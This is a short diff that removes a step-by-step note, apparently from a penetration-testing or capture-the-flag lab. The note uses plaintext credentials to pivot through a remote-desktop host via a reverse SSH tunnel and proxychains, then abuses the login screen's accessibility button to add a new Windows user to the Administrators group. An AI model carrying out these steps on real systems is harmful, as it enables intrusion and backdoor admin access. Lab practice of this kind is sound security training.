@@ -1,7 +1,0 @@
-1) sudo service ssh start on kali
-2) rdesktop to innerouter.artstailor.com and sign in as pr0b3 and H4ckB4ckJ4ck
-3) Use command prompt to ssh to kali using ssh -R 1081 kali@172.24.0.10 from innerouter
-4) on kali -> proxychains rdesktop books.artstailor.com 
-5) Click on accessiblity in the lower right hand side and run these commands
-    net user Liszt ChasseNeige12 /add
-    net localgroup Administrators Liszt /add
